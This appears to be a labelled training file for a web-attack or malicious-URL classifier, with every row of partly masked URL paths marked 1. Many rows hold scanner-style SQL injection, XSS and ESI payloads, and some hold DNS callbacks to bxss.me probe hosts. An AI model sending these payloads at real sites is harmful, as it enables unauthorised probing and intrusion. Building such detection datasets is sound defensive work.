sentences	labels
ru//***/f8kvl0wp/xhr_send?t=1632366085442 	 1
system/********/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/base64.js 	 1
images/*************/ajax_managed_services.php 	 1
xwdt/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/****/gzdt.htm 	 1
ru/**********/api.php?callback=jquery211027821724654516156_1466662510279}}1c027<script>alert(777)</script>cf2ea&type=get&mode=0&_=1466662510280 	 1
lcgg/********/javascript:void(0); 	 1
xxgk%' and 2*3*8=6*8 and 'iywl'!='iywl%/******/list.html 	 1
jsearchfront/template<esi:include src=""http://*******/rpb.png""/>/jcse/110105008056111/16/images/jquery.waterfall.js 	 1
lcgg/********/javascript:void(0); 	 1
lz/******/2021/09/14/javascript:void(0); 	 1
module/********/down.jsp?i_id=194814&colid=72' and 8101=3962 and 'wlqe'='wlqe 	 1
wzdt/config-browser/showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 1
swf/*************/zeroclipboard.swf?id="))}catch(e){}if(!self.a)self.a=!prompt(document.domain)//&width&height 	 1
icons/******/news/show/title/"><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c 	 1
qywh/****/ and 1>1 	 1
cpsms/********/javascript:void(0); 	 1
xwdt/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/****/1.htm 	 1
xxgk/******/tjj'""()&%<acx><script >covi(9951)</script>/zfxxgkml_2127/jytabljg_2061/list.html 	 1
col/*******/t/xss.html? 	 1
col/*****/index.html/"><script>alert(5755)</script> 	 1
icons/****/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
kjcx/******/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
xxgk/******/tjj%' and 2*3*8=6*8 and 'eqem'!='eqem%/zfxxgkml_2127/hygq_2064/list.html 	 1
lcgg1/********/javascript:void(0); 	 1
socket.gethostbyname('hitnp' 'sttuplrk424a2.bxss.me.')[3].to_s) '/**/images/autocomplete.css 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(1166)</script>?_=1630311769242 	 1
ru/*******/gvideos.php?gid=1 and 1=1 	 1
images/********/index.jsp?locale=""><script>alert(777)</script> 	 1
vc/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/***/easyui/themes/bootstrap/linkbutton.css 	 1
system/********/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/newcalendar/calendar.js 	 1
xwzx/****/2021_mtgz/202103/0'xor(if(now()=sysdate(),sleep(15),0))xor'z_271326.html 	 1
system/********/interview/room.jsp?wbinterviewid=1033%') or 2577=4433 and '%'='&owner=1707212448 	 1
zwgk/*****/5620/5642/index.html 	 1
qhly/******/2016/04/21/javascript:dozoom(9) 	 1
2016zt/******/2021/12/21/javascript:window.print() 	 1
prn/*****/index.php?o=panel&a=receiver.edit&id=alert(777) 	 1
ztsj/***/tjxx/202001/t20200121_1929212.html 	 1
lz/******/2021/10/25/javascript:void(0); 	 1
ddjs/****/202012/t20201214_264725.html' and 'x'='x 	 1
images//***********/phone.js 	 1
news/********/jishuchuangxin?page=1 and 3804=4490# 	 1
col/******/index.html/""><script>alert(4678)</script> 	 1
z/******/http://bxss.me/t/xss.html? 	 1
2013zt/***/js/jquery.kinslideshow-1.2.1.min.js/""><script>alert(34)</script> 	 1
system/resource%' and 2*3*8=6*8 and 'rrgp'!='rrgp%/**/formfunc.js 	 1
ywly/****/myjzgcsj//*/-->'""></iframe></script></style></title></textarea><script >alert(18406)</script> 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime%') or 6685=0380  	 1
gjcp/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
images'||'/***/hanweb.min.css 	 1
zfld/******/2015/08/17/javascript:window.close(); 	 1
wla/*********/daily_clickcount.json.jsp?callback=-1 or 9179=6545-- 	 1
gygj/************/index?search="">alert(/777/) 	 1
wla/*********/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271%') and 6385=6385  	 1
was5/***/search?perpage=*/-->'""></iframe></script></style></title></textarea><script >alert(89263)</script> 	 1
ywly/*****/index.html?continent=%') and 0965=0965  	 1
css/*********/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror="alert(777)"/> 	 1
system%' and 2*3*8=6*8 and '2rxr'!='2rxr%/********/js/formfunc.js 	 1
xwzx/****/202010/t20201028_255130.html and 1=1 	 1
index/******/2020/07/28/javascript:window.close(); 	 1
yqlj/******/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1 	 1
zwgk/****/bmyjs/zzqjcyxt/znxrmjcy/\"javascript:void(0)\" 	 1
index/******/2014/11/24/011565268.shtml 	 1
2017zt/******/2019/10/17/javascript:window.close(); 	 1
module/********/downfile.jsp?classid=0&filename=f8c2ed3e25ea4c269bf2e627a90b568a.docx and 2767=5833 	 1
index/****/javascript:void(); 	 1
xxgk/******/whgdj/?id=4001%' or 3082=3082 and '%%'='% 	 1
zfld/******/2021/08/25/javascript:window.print() 	 1
socket.gethostbyname(""hitld"" ""rwoptjvibaac2.bxss.me."")[3].to_s) ""/******/waterpull/pinterest_grid.js 	 1
2013zt/***/js/jquery-1.4a2.min.js/<img src="javascript:alert(50)"> 	 1
e/******/listinfo.php?mid='""()&%<acx><script >pkza(9131)</script> 	 1
xxgk/******/2013/http://bxss.me/t/fit.txt.html 	 1
ztpd/****/results.php?q='"--></style></script><script>alert(777)</script>&search=search&type=3 	 1
zwgk/****/bmyjs/zzqjcyxt/\"javascript:void(0)\" 	 1
index/******/2015/10/06/javascript:window.close(); 	 1
was5/***/search?page=2' or 5706=5706  	 1
inc/******/common/newaccount.aspx?btncancel=alert(777) 	 1
xq/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
xwzx/****/jt17/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
ldzc/*****/sz/202108/t20210806_http://bxss.me/t/xss.html? 	 1
xinanyanjiu/*************/nongchanpin/javascript:void(0) 	 1
e/******/showinfo/?classid='""()&%<acx><script >9wtx(9180)</script>&id=10317 	 1
ywly/*****/index.html?continent=' or 7230=7230  	 1
news/********/kuaguobinggou?*/-->'""></iframe></script></style></title></textarea><script >alert(04711)</script>=1 	 1
xwdt%' and 2*3*8=6*8 and 'ae9x'!='ae9x%/****/zjdt.htm 	 1
ldzc/*****/201903/t20190319_115324.html?leader="".gethostbyname(lc(""hitxn"".""ufcffjle32f81.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(113).chr(80).chr(121).chr(70)."" 	 1
zmhd/*****/hfswsj/'.gethostbyname(lc('hitjd'.'noxaxvoj4e841.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(119).chr(83).chr(102).chr(87).'.html 	 1
swld/******/2021/04/23/javascript:window.print() 	 1
gygj/*******/diary/new/submit.php 	 1
jsearchfront/********/jcse/110105008056111/16/bxss.me/style.css 	 1
was5/***/search?channelid=234439&orderby=relevance&perpage=24&searchword=1 and 9875=9875 	 1
swwj/******/2021/09/16/javascript:void(0); 	 1
xxgk/******/2014/bxss.me.html 	 1
art/****/12/25/art' and 2*3*8=6*8 and 'hnkm'='hnkm_37_224319.html 	 1
art/****/11/17/art_392_192567.html/"><script>alert(967)</script> 	 1
pic/*/10/01/15/10011527_998047.jpg 	 1
gygj/****/clgf/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
vc'||'/**/lib/easyui/plugins/jquery.panel.js 	 1
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448%') or 1446=2784  	 1
2016zt/******/2016/02/29/javascript:void(); 	 1
tupian/************/<img src="javascript:alert(184)"> 	 1
lz/******/2020/12/23/javascript:void(0); 	 1
wla/*********/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270') or 0776=0776 -- 	 1
newscenter/******/more/201000000000000/0079/javascript:void(); 	 1
0'xor(if(now()=sysdate(),sleep(12),0))xor'z/****/ghby/gzdt.htm 	 1
was5/***/search/search?page=3&channelid=287219%' and 5067=5067 and '%'='&searchword=1&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 	 1
xwdt/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/*******/gzdt/1.htm 	 1
xwdt/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/********/gcjybz/1.htm 	 1
e/*******/ 	 1
index/******/2019/10/12/javascript:void(0); 	 1
skin/if(now()=sysdate(),sleep(15),0)/***/jquery.js 	 1
ywzzq/*******/gvideos.php?gid=1 and 1=1 	 1
xxgk/*****/1088/1110/"".gethostbyname(lc(""hitsq"".""ywffddkiaf087.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(97).chr(68).chr(122).chr(72)."".html 	 1
xinanyanjiu%' and 2*3*8=6*8 and 'p0xj'!='p0xj%/************/guzhiqihuo/ 	 1
z/191211-8/*****/543527'""()&%<acx><script >i44y(9309)</script>.css 	 1
fxgg/********/javascript:void(0); 	 1
2017zt/******/2017/11/04/javascript:window.print() 	 1
xxgk<esi:include src=""http://*******/rpb.png""/>/zzxxgk/tjj/zfxxgkml_2127/hygq_2064/list.html 	 1
xwdt/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/****/gzdt.htm 	 1
socket.gethostbyname('hitjq' 'zaycmiwga6fb9.bxss.me.')[3].to_s) '/*****/grouppic/jquery.ad-gallery.js 	 1
index/******/2021/01/21/013323672.shtml/<img src="javascript:alert(131)"> 	 1
xwdt/*****/15.htm 	 1
nul/****/search.php?query=""onmouseover=""alert(1); 	 1
newscenter/******/2013/09/20/011193115.shtml 	 1
xwzx/****/2021_mtgz/202103/t20210316_271472.html" and "x"="y 	 1
zfld/******/2021/12/12/javascript:window.close(); 	 1
zmhd/*****/'""()&%<acx><script >lnxe(9670)</script>/202109/t20210906_186411.html 	 1
gygj/****/2013_506/ and 1>1 	 1
zwgk/*******/fdzdgknr' and 2*3*8=6*8 and 'q5ei'='q5ei/ghxx.htm 	 1
newscenter/******/2021/12/20/javascript:void(); 	 1
xxgk/'""()&%<acx><script >dwaj(9905)</script>/****/1081/list.html 	 1
dcwj/******/common/signin.aspx?tbemailaddress=alert(777)returnurl=/******/common/default.aspx 	 1
xwdt/****/jhcw/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm 	 1
lccp/********/javascript:void(0); 	 1
jsearchfront/********/jcse/110105008056111<esi:include src=""http://bxss.me/rpb.png""/>/16/images/plugin/selectpick/js.js 	 1
swwj/******/2021/04/06/javascript:void(0); 	 1
news/********/touzizixun?page=1 and 2634=2634# 	 1
newscenter/******/2020/09/13/javascript:window.print() 	 1
swld/******/2021/12/19/javascript:window.print() 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1 if(now()=sysdate(),sleep(6),0)/*'xor(if(now()=sysdate(),sleep(6),0))or'""xor(if(now()=sysdate(),sleep(6),0))or""*/&orderby=-docreltime&perpage=15&outlinepage=10 	 1
vc/********/ 	 1
icons/******/common/newaccount.aspx?btncreateaccount=alert(777) 	 1
socket.gethostbyname(""hitde"" ""mluirsua1ba1e.bxss.me."")[3].to_s) ""/****/10/11/art_34_242318.html 	 1
index/******/2021/11/17/javascript:void(); 	 1
xwzx'||'/****/2021_mtgz/202105/t20210505_273338.html 	 1
gygj/config-browser/showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 1
module/*****/'""()&%<acx><script >gejm(9283)</script>/jquery.ad-gallery.js 	 1
jsearchfront'||'/********/jcse/110105008056111/16/images/plugin/voice/voicerecorder.js 	 1
qhsw/******/2020/07/21/javascript:void(); 	 1
xxgk/******/list.html?new=/xfs.bxss.me 	 1
article/******/202007222122341228.html 	 1
module/**********/visit.jsp?i_webid[0]==extractvalue(1,concat(char(126),md5(1585232043)))and 3 in &i_columnid=1&i_webid[1]=3&type=1 	 1
module/**********/visit.jsp?i_articleid=242398&i_columnid=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&i_webid=1&type=3 	 1
xwdt/****/csjs/gzdt/13.htm 	 1
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' or 4576=4576 and '%%'='% 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(390)">?_=1630311387505 	 1
jsearchfront/*********/census.do?redirectaction:http://static.bxss.me/ 	 1
gjjtwzq/*****/index.php?o=panel&a=receiver.edit&id=alert(777) 	 1
0""xor(if(now()=sysdate(),sleep(12),0))xor""z/****/jzgl/gzdt/1.htm 	 1
zwfw' and 2*3*8=6*8 and 'xsle'='xsle/****/1.htm 	 1
nul/*****/ccmanage.php?find_enc=1&list=1"><script>alert(777)</script> 	 1
e/******/addinfo.php?submit=添加信息&classid=1&enews=maddinfo&mid='""()&%<acx><script >87cm(9833)</script> 	 1
zwgk/*******/zfxxgkzd/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm 	 1
zwgk/****/znjs' and 2*3*8=6*8 and 'fbxf'='fbxf.htm 	 1
zwgk/zfxxgk<esi:include src=""http://*******/rpb.png""/>/fdzdgknr/qtfdxx/ 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/websitechange/zwfwv3.js/""><script>alert(4710)</script> 	 1
xwzx/****/2020_szyw/ and 1=1 	 1
jsearchfront/********/jcse/110105008056111/**/and/**/7659=7659/16/images/view.js 	 1
jsearchfront/********/jcse/110105008056111/16/'""()&%<acx><script >qamc(9033)</script>/main.css 	 1
xxgk/******/tjj/zfxxgkml_2127/lzyj/list.html?new=bxss.me/t/xss.html? 	 1
ldzc/*****/http://bxss.me/t/fit.txt?.jpg/202108/t20210806_185416.html 	 1
qhly/******/2017/04/05/javascript:window.print() 	 1
socket.gethostbyname('hitcx' 'aetwgyshf3a9b.bxss.me.')[3].to_s) '/******/result.css 	 1
xxgk/*****/1088/1091/list.html?new=0.23628304015921864'""()&%<acx><script >grpf(9380)</script> 	 1
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448') or 4394=0062 and '1'='1 	 1
2021zt/******/2021/09/10/javascript:window.print() 	 1
qhly/******/2008/01/04/javascript:window.print() 	 1
0""xor(if(now()=sysdate(),sleep(12),0))xor""z/******/ywdt/11.htm 	 1
js/******/index.php?tid=default&lid=en_uk&f_email="">alert(777) 	 1
index/******/2021/01/21/013323672'""/>%uff1cscript%uff1ealert%uff081143%uff09%uff1c/script%uff1e.shtml 	 1
2017zt/***/javascript:void(0) 	 1
news/********/siluyiliao?page=1'"()&%<acu><script>9112(9131)</script> 	 1
js/*******/index.php?pagename=</script><script>alert(777)</script><!-- 	 1
zwgk/******/ncwywfgz/szss/plq/xmb_gzdxb%' and 2*3*8=6*8 and 'rneu'!='rneu%.htm 	 1
module/jslib'||'/********/jquery.ad-gallery2.css 	 1
news/********/gaocengdongtai?page=1' or 2462=2462 /* 	 1
vc/*******/lib/jquery/jquery.min.js 	 1
images/zh-cn/*******/;"style='acu:expre/**/ssion(x4cp(9599))'bad=" 	 1
con/*****/upgrade_unattended.php?db_type=<script>alert(777)</script> 	 1
z/******/index.shtml 	 1
socket.gethostbyname('hitmx' 'htrncijocc232.bxss.me.')[3].to_s) '/******/zmhdyc.html 	 1
index/******/2013/05/03/011077792.shtml 	 1
jsearchfront/'""()&%<acx><script >vpin(9807)</script>/****/110105008056111/16/images/plugin/waterpull/pinterest_grid.js 	 1
fxgg/********/javascript:void(0); 	 1
qhly/******/2021/11/24/javascript:dozoom(12) 	 1
zwgk/******/ncwywfgz%' and 2*3*8=6*8 and '0wrz'!='0wrz%/szss/plq/xmb_gzdxb.htm 	 1
index/******/2014/12/23/011591237.shtml?ivk_sa=1024320u 	 1
ywly/****/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
fr/****/201808/t20180808_194915.html' and 'x'='y 	 1
ssjn/*******/xxdj/ 	 1
module/***/jpage/bxss.me.js 	 1
outurl/****/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
system/********/js/news/if(now()=sysdate(),sleep(12),0).js 	 1
jsearchfront/********/bxss.me/110105008056111/16/images/common.js 	 1
ru/****/results.php?q='"--></style></script><script>alert(777)</script>&search=search&type=3 	 1
yqlj/*******/gvideos.php?gid=1 and 1=2 	 1
ztzl/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
xwzx/****/201608/t20160804_93597.html' and 'x'='y 	 1
/***********/zzxxgk/tjj/zfxxgkml_2127/jytabljg_2061/list.html 	 1
z/191211-8/*****/543527http://bxss.me/t/xss.html? 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(4694)</script>?_=1630312101338 	 1
xwzx/****/2017hydt_6392/ 	 1
module/**********/visit.jsp?type=>"'><script>alert(2059)</script>&i_webid=>"'><script>alert(2059)</script>&i_columnid=>"'><script>alert(2059)</script>&i_articleid=>"'><script>alert(2059)</script> 	 1
socket.gethostbyname('hitoi' 'kglbxleaf7bf3.bxss.me.')[3].to_s) '/**/art_34_242318.html 	 1
xinanyanjiu/************/0'xor(if(now()=sysdate(),sleep(6),0))xor'z/index_2.html 	 1
news/********/xinhuaqiyezixun?page='""()&%<acx><script >dgqe(9340)</script> 	 1
socket.gethostbyname(""hitvw"" ""svhrikna978d3.bxss.me."")[3].to_s) ""/***/easyui/plugins/jquery.panel.js 	 1
yqlj/******/formwlansetup?apmode=0&band=2&ssid=&chan=11&macaddrvalue=&wlanmacclone=0&wlanmac=&automacclone=no&repeaterssid=&wllinkmac1=&wllinkmac2=&wllinkmac3=&wllinkmac4=&wllinkmac5=&wllinkmac6=&x=54&y=12&wlan-url=test>alert(777)test 	 1
module/**********/visit.jsp?type=1'; select @@version,1,1,1--&i_webid=1&i_columnid=1 	 1
gygj/****/ and 1=1 	 1
news/********/zhixun?page=1 and 6768=6768# 	 1
xxgk/byysqgk' and 2*3*8=6*8 and 'hoa6'='hoa6/*******/list.html 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(6509)">?_=1630312351836 	 1
pic/***/10/87/32/10873219_948757.jpg 	 1
newscenter/******/2021/11/13/javascript:window.print() 	 1
ldzc/*****/201611/t20161121_76519.html?leader='.gethostbyname(lc('hitdz'.'hrceevxs76832.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(116).chr(68).chr(113).chr(86).' 	 1
qhly/******/2016/11/10/javascript:window.close(); 	 1
xxgk/******/tjj/?wvstest=javascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"") 	 1
userfiles/****/twphp.cer 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime') and 4422=0276 and '1'='1&perpage=15&outlinepage=10 	 1
theme/**********/bxslider-4/jquery.bxslider.js 	 1
newscenter/******/2021/12/18/javascript:window.print() 	 1
ywly/****/xnygc/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
xxgk/*****/1088/1097/list.html?new=/xfs.bxss.me 	 1
jsearchfront/********/jcse/110105008056111/16/images'""()&%<acx><script >uzie(9579)</script>/main.css 	 1
uploadfiles/*****/about_img.jpg 	 1
zwgk/*******/t/xss.html? 	 1
xxgk/******/tjj/zfxxgkml_if(now()=sysdate(),sleep(15),0)/hygq_2064/list.html 	 1
vc//***********/css/page.css 	 1
e/******/viewclick/?addclick=1&classid=-1); waitfor delay '0:0:8.394' -- &id=1285 	 1
ztzl/****/dtbb/jtdt/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
was5/***/search?page=2&channelid=253477&searchword=1%' or 2101=2101 /*&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
